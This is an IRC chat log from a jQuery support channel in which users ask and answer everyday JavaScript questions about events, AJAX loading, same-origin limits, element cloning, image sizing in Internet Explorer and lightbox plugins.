[00:01:30] <Cork> angelazou: the event never triggers the ajax call
[00:01:46] <Cork> though the pages code is completly unreadable so can't really help you
[00:02:02] <angelazou> unreadable? you mean the minify...?
[00:02:21] <Cork> well over minified ya
[00:05:04] <mrneeon> Is there a simple way of removing the last trailing item Like:  foo/bar/end = foo/bar
[00:05:16] <angelazou> Cork: it should be much better now, can you try again?
[00:06:02] <angelazou> Not sure if this is the culprit, but the plugin creates a form whose action is a JSON call
[00:06:03] <Cork> heh i wouldn't say much, but a bit
[00:08:04] <mindis|wurk> mrneeon regexp?
[00:08:48] <Cork> angelazou: if (window.location.indexOf("/zh/") >= 0) { is the problem
[00:08:58] <Cork> line 36
[00:09:07] <angelazou> um, really? that's just my addition to the script
[00:09:28] <angelazou> so that the button will link to the correct page (in the correct language)...
[00:09:56] <mrneeon> mindis|wurk: so somthing like: #/([^/]*)$#
[00:10:05] <Cork> angelazou: replace it with window.location.href.indexOf("/zh/") >= 0 and it should work
[00:10:26] <mindis|wurk> mrneeon sounds about right
[00:12:03] <angelazou> Cork: it worked, thanks...
[00:12:23] <Cork> angelazou: window.location isn't a String so it doesn't have indexOf
[00:12:31] <Cork> .href does
[00:12:47] <angelazou> I see, so that's what caused the script to stop executing?
[00:12:56] <Cork> yup
[00:13:03] <Cork> check your error console next time ;)
[00:13:17] <angelazou> but I had an else clause to catch the rest of them, why didn't it become effective?
[00:13:39] <Cork> casue the missing indexOf causes a throw
[00:13:47] <Cork> that means the entire function stops executing
[00:13:48] <mrneeon> Nah: dont seem to work.. Any regular expressions genius here? http://jsbin.com/ajexar/2/edit
[00:14:18] <angelazou> I see...one more question
[00:14:52] <angelazou> I've been running this script for quite a couple of days now
[00:14:54] <angelazou>  it actually gone bad only from yesterday
[00:15:00] <angelazou> when I tried it in the other language
[00:15:28] <angelazou> from what you are saying, the script shouldn't be working from the beginning...
[00:15:48] <Cork> angelazou: it should crash from the time you added that line ya
[00:16:57] <angelazou> um...
[00:28:50] <mindis|wurk> darn, isn't there any event that keeps triggering as long as mousebutton stays down?
[00:38:33] <Whirl3d> just set up a setInterval loop to keep firing until mouseup event happens
[00:41:59] <mindis|wurk> hmmh, maybe. the problem is i have multiple elements where i want to monitor this event and afaik mouseup won't work if it happens over another element
[00:43:28] <Whirl3d> handle the mouse event using .on and the top-most, common element
[00:44:40] <mindis|wurk> perhaps, we'll see
[00:53:43] <mutandi> anyone use Isotope? for some reason it won't load any images until I resize the window
[01:23:02] <obert-> hello,do you know a good alternative to lightbox galleries?
[01:31:21] <nFFF> Guys have a JS object, returned from a AJAX request. jsObject.text returns the HTML. I need to add a class to every element within jsObject.text. Any ideaS?
[01:33:08] <anandjeyahar> jsNoobie why does this http://dpaste.com/695945/ code gives an error saying Object has no method tabs
[01:33:10] <anandjeyahar> ??
[01:35:25] <alex88> hello guys, i've a parent div and a child div, smaller then the parent, how can i bind the click to the parent that triggers only when i click outside the child?
[01:36:55] <Hooloovoork> alex88: maybe bind a event to the child div with like return false; in the callback function
[01:36:59] <Hooloovoork> could work
[01:37:33] <Hooloovoork> i think there's a stopPropagation function or something like that you can try as well
[01:38:01] <alex88> Hooloovoork: oh, let me try that.. because i think that clicking on the child div will trigger the parent's click event too..
[01:38:48] <Hooloovoork> alex88: yea events does that stuff
[01:39:01] <Hooloovoork> they like dig down until they hit something
[01:40:08] <alex88> Hooloovoork: parent.click + child.click with stoppropagation did the trick, thank you very much! :)
[01:41:31] <Hooloovoork> alex88: np!
[01:45:03] <aqeel> hi ... i am back...
[01:45:22] <aqeel> well those sites cannot explain or fit into what i am doing
[01:45:47] <aqeel> http://jsfiddle.net/ or http://jsbin.com/
[01:46:14] <nFFF> Guys have a JS object, returned from a AJAX request. jsObject.text returns the HTML. I need to add a class to every element within jsObject.text. Any ideas?
[01:46:59] <aqeel> i am loding all my css into one external file and load it into js file ....which also calls.....all js files to be loaded....
[01:47:23] <aqeel> now i want to move jquery codes to external file as well
[01:47:42] <mindis|wurk> nFFF maybe something like var elements = yourobject.find('*'); elements.each( function() { $(this).addClass('derp'); });
[01:48:26] <aqeel> i would like to move my code from html script to external file and have it loaded....
[01:49:06] <aqeel> simply copying it into external file does nothing....
[01:51:45] <aqeel> any would like to help me out
[02:04:02] <Sjoerder> When I call jQuery.getScript(url, someFunction), the someFunction callback seems to be executed before the script has executed. Is it supposed to work like this?
[02:04:13] <Sjoerder> I want to use a function in my callback which is defined in the script.
[02:42:45] <iamamoron> hi there
[02:42:59] <iamamoron> i have 2 divs which uses .load
[02:43:11] <iamamoron> each div have its own url
[02:43:18] <iamamoron> problem only 1 fires up
[02:43:25] <iamamoron> others is not displaying
[02:43:43] <iamamoron> i want to display the different page to the divs
[02:43:46] <iamamoron> any ideas?
[02:43:49] <iamamoron> on .load()?
[02:44:23] <xec> iamamoron: .load() can do two things - i assume you're using it as an ajax query and filling a div with the result?
[02:45:04] <iamamoron> actually as sample here
[02:45:14] <mrneeon> Anyone with some spear time? I need a litte help here.. http://jsbin.com/ojaxul/3/edit   I'm using the shift-key to select rows, but I cant figure out how to deselect :(
[02:45:29] <iamamoron> $("#div1").load('http://yahoo.com');
[02:46:00] <iamamoron> $("#div2").load('http://google.com');
[02:46:03] <iamamoron> it doesnt work
[02:46:07] <iamamoron> only yahoo displays
[02:46:27] <iamamoron> you can try and see for yourself
[02:47:08] <xec> iamamoron: can you see both hxr requests fire?
[02:47:23] <iamamoron> only 1 fires
[02:47:37] <iamamoron> if i comment yahoo
[02:47:39] <iamamoron> google loads
[02:47:58] <iamamoron> the second div will not have any value
[02:48:05] <iamamoron> if div1 already processed
[02:48:10] <iamamoron> you can try to see
[02:48:14] <iamamoron> the logic is simple
[02:49:37] <xec> iamamoron: are both requests at the same domain your script is hosted at?
[02:49:57] <iamamoron> the same domain
[02:50:07] <iamamoron> xec: can you try it yourself
[02:50:09] <iamamoron> and show me
[02:50:18] <iamamoron> because if you are asking question
[02:50:25] <iamamoron> over and over
[02:50:32] <iamamoron> you cannot know unless you see it
[02:50:37] <iamamoron> can you?
[02:51:06] <xec> iamamoron: you can make a demo, and show us. try jsfiddle.net
[02:51:16] <mindis|wurk> this is a silly question but you're sure both divs are seperate and one is not the parent of the other?
[02:51:22] <iamamoron> no it is simple
[02:51:27] <iamamoron> just copy what i pasted
[02:51:31] <iamamoron> and have 2 divs
[02:51:37] <iamamoron> so that you can see
[02:52:57] <xec> iamamoron: well that's just it - you can't execute ajax to foreign domains because of same origin policy. your contrived example will not work.
[02:55:10] <xec> iamamoron: http://jsfiddle.net/D2qXN/1/
[02:55:23] <xec> neither works
[02:59:19] <toxz> if i a have a table with 300 rows - how can i delete all rows after the 200st row?
[03:02:24] <xec> $('table tr').eq(198).nextAll().remove()
[03:02:27] <xec> something like that?
[03:03:30] <xec> or $('table tr').slice(199).remove()
[03:03:53] <toxz> xec - mmm looks good and simply - ill try that
[03:04:08] <toxz> if was using a loop and thought thats can be easier
[03:05:33] <iamamoron> http://jsfiddle.net/D2qXN/1/
[03:05:37] <iamamoron> is not accessable
[03:05:39] <iamamoron> :D
[03:06:11] <xec> iamamoron: works for me, but jsfiddle has been slow lately
[03:06:29] <toxz> xec  - $('table tr').slice(199).remove() - i think this is great
[03:06:49] <xec> cool :)
[03:07:59] <GreyTrilby> Hi guys. Have a form which has an edit, save, and cancel button. On clicking 'edit' the form becomes editable, the 'edit' button disappears and the 'save'/'cancel' buttons appear. Been working fine for weeks.Yay :) I want to clone these buttons (and their functionality) and add them to a right-click context menu. But it's not quite working. the clone works, but only partly.
[03:08:01] <smooki> ok guys, hello
[03:08:08] <iamamoron> 504 Gateway Time-out
[03:08:26] <fiftysmackers> Hi! im looking to create two texareas adjacent to each other, in the right area I want a list, and when I press one of the items in the list, I want subelements of this item to be listed in the left area. What is this concept called? Does anyone know where I can find a tutorial on how to do this?
[03:08:26] <smooki> it there a Jquery feature/plugins to enable/disable a group of input please ?
[03:08:53] <GreyTrilby> Right clicking successfully brings in the duplicate 'edit' button, and clicking either this or the duplicate puts it in 'edit' mode, but when clicking the duplicate, the save/edit buttons fail to appear
[03:09:03] <mindis|wurk> smooki seems like a fairly trivial thing to code
[03:09:17] <smooki> ok
[03:09:18] <mindis|wurk> just loop through the inputs and set them to disabled
[03:09:21] <GreyTrilby> Code here:http://jsfiddle.net/Cu7ZR/ - can someone please advise - I know I'm missing something pretty obvious
[03:09:31] <smooki> ok ok
[03:09:48] <iamamoron> no my case
[03:09:50] <iamamoron> is not yahoo
[03:09:55] <iamamoron> i got what you saying
[03:10:02] <iamamoron> the domain is the same
[03:10:50] <xec> iamamoron: pastebin your code, maybe someone can spot a fault
[03:11:13] <mrneeon> GreyTrilby: U'r using mootools
[03:11:20] <iamamoron> actually it is the same file i called
[03:11:24] <iamamoron> variable are not equal
[03:11:47] <iamamoron> same URL of php
[03:11:53] <iamamoron> but different variable
[03:12:00] <GreyTrilby> mrneeon - nope - just jquery
[03:12:00] <iamamoron> it the url is treated as one
[03:12:22] <mrneeon> Well.. that example has mootools included, not jquery..
[03:13:23] <GreyTrilby> @mrneeon - where? possible I've named a function the same as mootools, but i'm not using it :) (and don't hav mootools in the site anywhere)
[03:13:26] <xec> GreyTrilby: http://jsfiddle.net/Cu7ZR/1/ <-- selected jquery from the "choose framework" ;)
[03:13:38] <mrneeon> what xec said :)
[03:14:16] <GreyTrilby> ahh - oops - sorry - bit new to all this fiddling malarky :) just wanted to share the code
[03:14:56] <poppiez> is it just me or is the jquery animate complete callback firing too soon in some cases?
[03:16:13] <Hornet-> has anyone encountered a plugin to deal with creating/removing groups of draggable elements?
[03:16:39] <Hornet-> eg I'd have a set of items on the left, the user can make a group box to drag them into, and remove it if desired
[03:17:06] <Hornet-> so basically they can sort elements into any desired number of sets
[03:17:22] <mrneeon> Anyone know of a plugin / snippet that mimics how finder/explorer select files in a list-view? I have this: http://jsbin.com/ojaxul/3/edit .. but its buggy as hell when using the shift-key
[03:22:17] <smooki> how to handle click on radios collection, as the id is identical to all ?
[03:25:58] <poppiez> anyone else had a problem with the $.animate callback firing before the animation ends?
[03:26:12] <Kingsy> do height() and width() work in ie7 and 8 ?
[03:26:21] <Kingsy> they don't seem to be getting applied for me
[03:26:57] <Kingsy> I don't know if there is a better way of setting a height and width to a <img> in jquery other than that? something that is cross browser compat
[03:27:23] <jomofcw> Kingsy you mean "set the hieght attribute of an image" ?
[03:27:39] <jomofcw> height() and with() method is about CSS property.
[03:27:41] <GreyTrilby> RIght - updated my code - it's replicating my problem properly on jsfiddle now http://jsfiddle.net/Cu7ZR/7/ - on clicking "edit", div goes black & two buttons appear. This is correct. On right click and choosing edit, the div goes black, but the buttons DON'T appear. Can someone please hel me find out why? Cheers!
[03:28:07] <Kingsy> jomofcw: oh, yeah set the height and width attribute on the img tag
[03:32:18] <jomofcw> GreyTrilby it should be messed up because you clone an object having an id and don't change it...
[03:32:58] <jomofcw> GreyTrilby : http://jsfiddle.net/Cu7ZR/9/
[03:33:03] <GreyTrilby> jomofcw - that makes sense! (Doh)
[03:33:04] <jomofcw> look at the removeAttr I had
[03:33:11] <Kingsy> jomofcw: so $('someImg').height(300); wouldnt change the img height attribute?
[03:33:12] <jomofcw> add
[03:33:39] <jomofcw> Kingsy it won't in fact. You have to use $img.attr('height',value);
[03:33:52] <jomofcw> but dunno if it will change the image size in real.
[03:33:52] <Kingsy> ah ok cool
[03:34:18] <jomofcw> Because this should be eval only when DOM read at the first time.... rly dunno what it could do
[03:34:22] <jomofcw> tias so ^^.
[03:34:32] <GreyTrilby> jomofcw - thank you - but how, when the id is removed does it still pick up the function which is defined by searching for id?
[03:34:52] <GreyTrilby> (i.e. the jquery looks for an id and applies a function - if the id isn't there, why does the function work?)
[03:35:11] <jomofcw> GreyTrilby you clone it using clone(true) so each event already bind is cloned too.
[03:35:28] <jomofcw> because the function is already apply ;)
[03:35:30] <Kingsy> jomofcw: hmm no it doesnt seem to work.. it does in FF and chromje
[03:35:34] <GreyTrilby> ahhhh... of course *whirrrrrrrrr... click*
[03:35:36] <jomofcw> It just "copy" it to the new element.
[03:35:56] <Kingsy> actaully scrap that..
[03:36:01] <jomofcw> Kingsy what are you trying to do ?
[03:36:02] <Kingsy> it doesnt work in FF or chrome either
[03:36:02] <GreyTrilby> jomo - you're a gentleman! Just need to work out how to remove that other 'edit' button now, but will have a go myself before crying!
[03:36:02] <mindis|wurk> how would i go about selecting certain kind of elements only from the first level of children and not from grandchildren? in this case i have lists inside of lists and i'd only like to get the first level <li>, not the <li> that are inside of them
[03:36:22] <Kingsy> jomofcw: resize a image in a lightbox depending on a users resolution
[03:36:36] <Kingsy> jomofcw: it works on FF and chrome.. IE 8 and 7 it doesnt reszie
[03:36:40] <jomofcw> GreyTrilby just $('#editFields').remove() :)
[03:36:48] <Kingsy> (I had it wroking with height() and width() )
[03:37:11] <GreyTrilby> jomofcw - was going for hide(); actually :) Just want to make sure it works before I leave though!
[03:37:12] <jomofcw> Kingsy so you should use height() and width() method imo.
[03:37:20] <jomofcw> Kingsy any online example ?
[03:37:24] <Kingsy> jomofcw: but it doesnt work in IE
[03:37:31] <Kingsy> I don't its on a localhost
[03:37:49] <Kingsy> jomofcw: height() and width() is great but in IE the image doesnt resize
[03:37:50] <jomofcw> GreyTrilby français ? (because you used actually instead of currently imo ^^)
[03:38:05] <jomofcw> Kingsy strange, those methods should be crossbrowser
[03:38:19] <GreyTrilby> nope - i'm english (trilby, not beret!) ;)
[03:38:28] <jomofcw> Kingsy have you tested to debug it using debug bar under IE ?
[03:38:42] <jomofcw> GreyTrilby so I should be wrong about this "actually" things xD.
[03:38:54] <GreyTrilby> yep - suspect so
[03:39:11] <jomofcw> I should learn more thing about it.
[03:39:26] <Kingsy> jomofcw: what do you mean?
[03:40:07] <jomofcw> I find this channel really really quiet... where are all the pro ? PaulIrish ? John ? And each other oO.
[03:40:34] <jomofcw> Kingsy use debug bar to see what the width/height method do
[03:40:40] <jomofcw> And why it seems to not be apply
[03:41:58] <Kingsy> jomofcw: well I have just checked the element with the debugbar and the height and width isnt being set for sure
[03:42:17] <Kingsy> jomofcw: how would you use the debug bar to see what the method does??
[03:44:27] <GreyTrilby> jomofcw - you're a gent - thank you so much (be warned - I may come back and pick on you if it doesn't work on my local server with all the correct functions added!)
[03:45:14] <jomofcw> GreyTrilby you're welcome
[03:45:35] <jomofcw> Kingsy just test it after it may apply.
[03:45:53] <jomofcw> Kingsy when you write "height isn't apply" you speak about the attr or the CSS ?
[03:47:47] <Kingsy> the css .. I am using   jQuery('#lightboxImage').height(200); for example..
[03:48:08] <jomofcw> Kingsy I really need to this in action :/...
[03:48:26] <Kingsy> if you enter that into the script box in the debugbar it returns "590" for some reason, shouldnt it return 200 if thats what I am setting? or true
[03:48:45] <Kingsy> hmm damn
[03:51:00] <Kingsy> let me try and reproduce this in a jsfiddle
[03:52:54] <jomofcw> Yea please
[03:53:18] <jomofcw> It will be easier to understand what could be wrong.
[03:53:34] <jomofcw> I just get out from the office for few minutes. Will be back soon :).
[03:53:38] <AdvoWork> If i'm doing: $("#send_po_div").load('send_order.php?order_number=16554').dialog({  how can i close the dialog? i'd normally specify the id of the dialog, but can't doing it with a load can i? i've tried: $( this ).dialog( "close" );  but that did nothing
[03:54:11] <jomofcw> That's strange :S
[03:54:33] <jomofcw> i'm not sure that load is chainable.
[03:55:16] <jomofcw> what about $("#send_po_div").load('send_order.php?order_number=16554',function(){$(this).dialog()})
[03:55:22] <jomofcw> I've not use dialog since a while
[03:56:04] <jomofcw> $("#send_po_div") is the dialog ?
[03:56:56] <Kingsy> jomofcw: yeah, it actually works in the jsfiddle example, which is even more confusing
[03:56:57] <AdvoWork> jomofcw, although, on the dialog is a cancel button, which does: $( this ).dialog( "close" ); and works, so in theory it should?!?  and not sure about that div, will check now
[03:57:53] <jomofcw> AdvoWork yea but you add buttons using the buttons option of the dialog, right ?
[03:58:03] <jomofcw> So in it $(this) is the dialog
[03:59:08] <jomofcw> $("#send_po_div").dialog('close') should work anyway
[03:59:43] * jomofcw afk
[04:00:58] <AdvoWork> jomofcw, will try that thanks
[04:09:25] <mrneeon> I'll try again.. somebody gotta know...
[04:09:29] <mrneeon> Anyone know of a plugin / snippet that mimics how finder/explorer select files in a list-view? I have this: http://jsbin.com/ojaxul/3/edit .. but its buggy as hell when using the shift-key
[04:09:57] <mrneeon> http://jsbin.com/ojaxul/4/edit
[04:20:06] <jomofcw> dunno mrneeon
[04:20:17] * jomofcw back
[04:20:34] <g[r]eek> Hi is there a jQuery function to convert a javascript array to JSON? Thanks.
[04:21:04] <Ortund> g[r]eek that's a very specific requirement... I don't think you'll find something that does it automatically for you
[04:22:04] <Log1x> hii. im trying to learn jquery and do a minimal content ordeal with jquery. http://jsfiddle.net/kawQC/ im trying to append the #contentHeader and #content in jquery to my #contentWrapper so that each of my pages doesn't have to include the contentheader and content divs themselves. it doesn't seem to be working...any help please? :)
[04:23:11] <Log1x> contentwrapper shows up as it should but there's no content since it seems as if #content/#contentheader aren't getting applied or something is conflicting :{
[04:23:27] <g[r]eek> Ortund, I agree it is very specific. After coming across this - http://api.jquery.com/jQuery.parseJSON/ - I thought it might be possible.
[04:28:24] <devmikey> Has anyone here been following my epic cache fighting quest?
[04:28:26] <g[r]eek> Apart from JSON, what are my other formatting options for sending data to my target Ajax scripts? I'm calling these via the .load(...) jQuery function.
[04:30:45] <devmikey> FYI, opera works with just headers being sent
[04:30:51] <devmikey> no ?Date required
[04:38:58] <jomofcw> Log1x that's hell ! Don't use JS as a template engine.
[04:39:43] <Log1x> :/ is there any other methods i can do to have a more fluid way of bringing up my content? to go with my design
[04:39:55] <jomofcw> Log1x PHP ,
[04:39:56] <jomofcw> ?
[04:40:10] <jomofcw> ASP ?
[04:40:37] <Log1x> i want you to be able to close the window the content comes up in to show the background if possible :| jquery seemed to do that fine if i could get something together
[04:40:42] <Log1x> but i can see how it'd be problematic with dynamic content
[04:41:23] <jomofcw> Log1x yeap jQuery is here to do that
[04:41:26] <jomofcw> hiding a DOM element
[04:41:30] <jomofcw> for example
[04:41:33] <jomofcw> but not for templating
[04:41:53] <jomofcw> you know you could make your website using PHP/HTML/CSS/JS(via jQuery) ?
[04:42:16] <Kingsy> hmm nope I just cant figure this out ==> jQuery('#lightboxImage').remove(); <-- works.. I can remove the image.. but jQuery('#lightboxImage').height(200) doesnt do anything in IE
[04:42:52] <Log1x> could you lead me in the right direction of getting fluid content to work with jquery? would i just have content be included with php but have jquery hijack the links and display a certain element within the page for the content? that way it'd work without JS
[04:42:53] <Log1x> or ._.
[04:43:47] <g[r]eek> Ortund, turns out that this solves my problem (I failed to point out earlier that I was submitting a form): http://api.jquery.com/serializeArray/
[04:43:52] <Log1x> id like to not have the literal window/page change when viewing content to create a more fluid feel if possible, but if you think it's absurd ill ditch the concept
[04:44:17] <Ortund> good to know g[r]eek :)
[04:44:42] <jomofcw> Kingsy can't help without online example :( sorry.
[04:45:04] <Log1x> if you wouldn't mind jomofcow i could link you the page im working on and if you could give your opinion on how i could work the content. i know a bit of PHP but nothing in my head is really clicking together to make them work together to do the content more dynamically
[04:45:11] <jomofcw> Log1x... jQuery is JS...
[04:45:16] <Log1x> i know
[04:45:26] <jomofcw> So, how to do that avoiding JS use :x N?
[04:46:11] <Log1x> yeah, or how to make php and js work together to fetch the content instead of js just fetching it
[04:46:29] <Log1x> can I PM you my link? i just want to know if its possible to do what im doing without using jquery for fetching content
[04:46:32] <Kingsy> jomofcw: np.. I am trying to think of how I can get you an online example
[04:47:17] <jomofcw> Log1x yep, but I'm really not sure about what you're trying to do
[04:50:45] <logeshpaul> Hey everyone, I have a doubt. I found people using jQuery() instead of using $(''). what is the difference between them?
[04:51:10] <Hornet-> has anyone encountered a plugin to deal with creating/removing groups of draggable elements? eg I'd have a set of items on the left, the user can make a group box to drag them into, and remove it if desired
[04:51:41] <Ortund> logeshpaul as far as I've seen, nothing
[04:51:50] <Ortund> think it comes to personal preference
[04:53:01] <logeshpaul> Ortund ok so technically it doesn't meant anything right
[04:53:45] <Kingsy> jomofcw: you there? I have an example online if you wanna take a look ???
[04:54:20] <hazamonzo_> hey folks. im using #DIV_BU td:nth-child(1) to get the first column of a table within the DIV_BU div... now what if i wanted to get certain content of the 1 column? In the first column i have a an ipnut and a span with a class... i want to select the span
[04:54:44] <Ortund> logeshpaul correct... as far as I know anyway
[04:54:53] <jomofcw> Ortund logeshpaul the difference is $ could be in conflict with other library. jQuery won't
[04:55:05] <jomofcw> So in plugin you should use jQuery
[04:55:20] <Kingsy> jomofcw: http://www.kingsy.co.uk/lightboxtest/14146.html <--- check it out <-- its pretty rough but you can see the fault..  click on the image in the center of the screen
[04:55:40] <Ortund> jomofcw so for instance if you want to use jquery on your wordpress app, then you'd use jQuery?
[04:55:47] <AdvoWork> if i have a jquery datatable so table id="test"  how can i completely disable that table, any ideas please?
[04:55:54] <Kingsy> jomofcw: in FF it expands so it fits in the screen resolution.. say as in chrome... then try it in IE.. you can see it doesnt resize
[04:55:57] <jomofcw> the best way to do it is to use something like jQuery(function($){}) that avoid all conflict, and enable you to use $ as well.
[04:56:38] <Kingsy> jomofcw: you see it?
[04:56:42] <jomofcw> AdvoWork jquery db oO ?!
[04:56:48] <jomofcw> Kingsy yeap give it a look
[04:56:55] <logeshpaul> jomofcw thanks! so if we are using other libraries like prototype or something its better to use jQuery instead of $
[04:57:19] <jomofcw> logeshpaul yep, or you to use the noconflict things. Not the best way to do it IMO
[04:57:23] <Kingsy> jomofcw: np.. let me know what you think .. I am pretty stumped.. it must be where I am using the code to resize the image but I cant see why it wouldnt work.. (as it does in FF)
[04:58:48] <logeshpaul> jomofcw Ortund thanks for the help!
[04:59:07] <jomofcw> You're welcome :).
[04:59:49] <jomofcw> Kingsy could I ask which lightbox script you're using ?
[05:00:09] <Kingsy> its a magento extension called "easylightbox"
[05:00:28] <Kingsy> thats not the issue tho is it? its the facy that its not applying a rule
[05:00:30] <jomofcw> Hm... magento is hell... probably this extension is too :P !
[05:00:36] <Kingsy> hehe
[05:00:46] <Kingsy> jomofcw: you can see the js attached to it in   lightbox.js
[05:00:55] <Kingsy> I can pastie it if you want to see it?
[05:00:55] <hazamonzo> annn i wanted >
[05:01:42] <jomofcw> OMFG, that's an old old light box oO
[05:02:28] <Kingsy> hehe.. yeah its an old extension.. but it works
[05:03:14] <jomofcw> Anyway, you want help Kingsy and I should try to do it, instead of laughing about those magento thing (I'm really angry about magento :)).
[05:03:37] <jomofcw> In the example you give me, it doesn't load the image, is it normal ?
[05:04:06] <Kingsy> it doesnt load the image? you click the purple necklace and it will load the lightbox
[05:04:12] <Kingsy> yeah?
[05:04:20] <jomofcw> right
[05:04:26] <jomofcw> but it still be "loading"
[05:04:31] <Trudko> Guys whats the proper way how to remove  listener(keydown())
[05:04:41] <Kingsy> jomofcw: ?? really? it works here
[05:05:12] <Kingsy> jomofcw: refresh or something, I don't know what to say.. it works fine here
[05:06:18] <jomofcw> kinesis two strange thing : refreshing it doesn't help. And anyway I have two #lightbox in the page...
[05:07:59] <Kingsy> ffs I don't know then..
[05:14:30] <GreyTrilby> jomofcw -thanks for help earlier - got it all working now (the cloning issue). Fun mission now is getting it to work in JQueryUI tabs - sure, they're pretty, but they don't have screw everything up (have to name EVERYING absolutely uniquely - even certain classes as they all seem to be loaded into the DOM at once. Ho hum. Anyhow, thanks again for your help!
[05:15:09] <JAAulde> morning all
[05:15:27] <jomofcw> GreyTrilby try to work with class and child ;). And anyway : np =).
[05:15:55] <jomofcw> Kingsy I'm really sorry :/ I just ask you for an example, and I can't get it work here :/.
[05:16:54] <jomofcw> Kingsy anyway I thing it's a bug fixed in the other ligtbox
[05:17:21] <Kingsy> jomofcw: what was the bug fix?
[05:17:30] <Kingsy> do you hvae any information on it?
[05:18:03] <jomofcw> Kingsy nop :/... what this extension do ? could you replace this oldies lightbox script by a fresh colobox ?
[05:18:35] <jomofcw> Kingsy : http://jacklmoore.com/colorbox/ that's the better one I know
[05:18:50] <jomofcw> and you need to use the latest jquery to do it well.
[05:19:00] <Kingsy> I will look into it I guess
[05:19:05] <Kingsy> jomofcw: thanks anyways for looking
[05:20:18] <TDMAdmin> hover is only working on firefox and no other browser. thanks
[05:21:28] <TDMAdmin> sorry above is more css, cn anyone help?
[05:24:59] <Ortund> TDMAdmin having some code to look at would be helpful
[05:25:15] <Whirl3d> does jquery.sort affect the dom? and if not, how do I apply the changed sort order to the dom?
[05:25:31] <Hornet->  has anyone encountered a plugin to deal withcreating/removing groups of draggable elements? eg I'd have a set of items on the left, the user can make a group box to drag them into, and remove it if desired
[05:31:10] <guidocalvano> hey people
[05:31:24] <Whirl3d> hello
[05:31:29] <guidocalvano> I don't know how to interpret the documentation on the jquery site
[05:31:40] <guidocalvano> its about ajax
[05:31:53] <guidocalvano> if I set a timeout
[05:32:05] <guidocalvano> and the transfer times out
[05:32:17] <guidocalvano> *the ajax request times out
[05:32:25] <guidocalvano> but it arrives at the server anyway
[05:32:35] <guidocalvano> and the server then sends a reply
[05:32:37] <Whirl3d> set a longer timeout
[05:32:45] <guidocalvano> first error will be called
[05:32:59] <guidocalvano> but will success also be called later?
[05:33:34] <Whirl3d> You mean if it takes longer than your declared timeout to transfer the file?
[05:34:00] <guidocalvano> no, the message gets lost
[05:34:08] <guidocalvano> *no not lost
[05:34:22] <guidocalvano> it takes long to get to the server
[05:34:35] <guidocalvano> and the reply from the server comes in anyway
[05:34:52] <guidocalvano> after jquery thought it had timed out
[05:36:11] <jomofcw> guidocalvano nop, an ajax thing could only have one "issue"
[05:38:07] <guidocalvano> issue?
[05:38:31] <macouno> Hi guys, I'm trying to get the .height() of an item with dynamic content... the value I get seems incorrect at times..
[05:39:12] <jomofcw> yea xD I know that's not the right word
[05:39:14] <jomofcw> "end"
[05:39:26] <Hooloovoork> macouno: when and how are you changing height? when does it seem incorrect?
[05:40:13] <jomofcw> So when the timeout is over, it call complete, and error, with the textstatus "timeout" and it's over. Any responses send by the server won't be eval by jQuery.
[05:44:16] <guidocalvano> jomofcw: that's what I thought
[05:45:24] <nFFF> Guys have a JS object, returned from a AJAX request. jsObject.text returns the HTML. I need to add a class to every element within jsObject.text. Any ideas?
[05:45:26] <jomofcw> Except for script loading and JSON.
[05:46:28] <jomofcw> $(jsObject.text).find(*).addClass('foo');
[05:47:53] <macouno> Hooloovoork: I change the height by changing the content with a item.html('something'); then retrieve the .height() and its inconsistent...
[05:49:33] <Hooloovoork> macouno: if you try doing that and printing the height, then try grabbing the height of the same div from a js console, is it the same?
[05:52:44] <Whirl3d> ?.outerHeight
[05:52:44] <bot-t1> .outerHeight([includeMargin]): Get the current computed height for the first element in the set of matched elements, including padding, border, and optionally margin. http://api.jquery.com/outerHeight/
[05:56:35] <io__> hi, i have a "div1" with position:absolute bottom:0 so that it is palced on the bottom of the page, then I am using jQuery to add dynamically content to the page, but "div1" won t change it sposition accordingly, how ot fix that?
[05:56:55] <macouno> Hooloovoork: what's the difference between pritning and grabbing from a console?
[05:57:06] <macouno> Hooloovoork: I'm just console.log(item.height());
[05:57:48] <Hooloovoork> macouno: if item variable is the globally you can do that
[05:57:55] <macouno> It seems like it's not the .height() function itself... but that the html I put in the item isn't "rendered?" correctly yet... or something... I tried adding a timeout, but that didn't help
[05:58:01] <Hooloovoork> the difference is that they run at different times
[05:58:13] <macouno> Well... the time doesn't seem to matter much
[05:59:16] <Hooloovoork> macouno: then gimme a jsfiddle where it happens
[05:59:18] <Whirl3d> io__ try fixed positioning. It's really more of a #css question
[05:59:53] <sodhi> can anyone tell me why $('#foo').draggable({handle: '#'+$(this).attr('id')+'[class="toolbar"]'}); is non-functioning? rather, the handle does not seem to register (I assume the selector is somehow invalid, but I fail to see why).
[06:00:46] <macouno> jsfiddle?
[06:00:54] <sodhi> wwww.jsfiddle.net
[06:01:01] <sodhi> oops
[06:01:04] <sodhi> one w too much
[06:01:31] <Hooloovoork> ?jsfiddle @ macouno
[06:01:32] <bot-t1> macouno, jsFiddle (http://jsfiddle.net) is an online IDE for HTML, CSS, and JavaScript. It is the best way to provide test cases of your jQuery bugs (for support and the bug tracker). Make sure to include the jQuery library (on the left side) and any relevant markup or CSS. You can include external dependencies via the Add Resources tab. You can also mock AJAX requests.
[06:01:35] <macouno> http://www.pasteall.org/28733/javascript
[06:02:12] <macouno> Yeah sadly this thing is a bit too complex to make a nice neat testcase
[06:02:35] <Hooloovoork> macouno: i made a webgl renderer in it, so i don't think anything is too complex =P
[06:03:16] <macouno> Ok... "I don't have that sort of time"
[06:03:20] <macouno> ;)
[06:03:20] <smooki> hello
[06:03:28] <macouno> But thanks for having a looksee, I appreciate it
[06:03:30] <Hooloovoork> macouno: neither do i.
[06:03:34] <smooki> , how can I catch radioButtons changes ?
[06:04:18] <sodhi> .change
[06:05:00] <sodhi> that'd take you exactly 10 seconds of googling, pasting your direct question in to google yields me: http://api.jquery.com/change/
[06:05:20] <sodhi> as the first result, that is.
[06:05:33] <Hooloovoork> =D
[06:06:30] <jeffsmykil> Can anyone recommend a date picker that doesn't have the positioning "feature" of jquery uis?
[06:06:59] <smooki> ok
[06:07:17] <sodhi> jeffsmykil: what feature might that be?
[06:09:03] <jeffsmykil> sodhi it has this weird auto collision feature, and I'm finding it extremely difficult to position correctly
[06:19:45] <kevindougans> anyone know the best way to show a big youtube video then 3 thumbnails underneath and make the thumbnails when clicked load in the big video
[06:23:53] <kevindougans> http://pastebin.com/KVYWdzaZ looks the best solution
[06:24:29] <AdvoWork> if i have a jquery datatable so table id="test"  how can i completely disable that table, any ideas please?
